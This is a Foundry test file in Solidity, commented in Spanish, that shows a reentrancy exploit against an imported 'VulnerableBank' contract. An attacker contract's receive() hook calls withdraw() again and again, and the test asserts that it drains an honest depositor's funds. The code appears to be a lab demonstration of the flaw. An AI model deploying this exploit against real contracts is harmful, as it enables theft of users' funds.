// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/Reentrancy.sol";

// Simulamos un Smart Contract de usuario que invierte en el banco
// Simplemente tiene una función fallback asíncrona "natural".
contract MaliciousDeFiUser {
    VulnerableBank public bank;

    constructor(address _target) {
        bank = VulnerableBank(_target);
    }

    function invest() external payable {
        bank.deposit{value: msg.value}();
    }

    function divest() external {
        bank.withdraw();
    }

    // Funcionalidad natural de recepción de fondos explotando asincronía (Reentrancy)
    receive() external payable {
        // En lugar de forzar con "try", simplemente llamamos normalmente si tenemos gas
        if (address(bank).balance >= msg.value && gasleft() > 10000) {
            bank.withdraw();
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableBank bank;
    MaliciousDeFiUser attacker;

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new MaliciousDeFiUser(address(bank));

        // Usuario honesto fondea el banco (TVL legítimo)
        vm.deal(address(0x1), 10 ether);
        vm.prank(address(0x1));
        bank.deposit{value: 10 ether}();
    }

    function test_natural_reentrancy() public {
        // Atacante interactúa normalmente depositando
        vm.deal(address(attacker), 1 ether);
        attacker.invest{value: 1 ether}();

        // Inicia el retiro que desencadenará el receive() asíncrono
        attacker.divest();

        // Verificamos que el atacante drenó a los usuarios honestos
        assertGt(address(attacker).balance, 1 ether);
    }

    receive() external payable {}
}
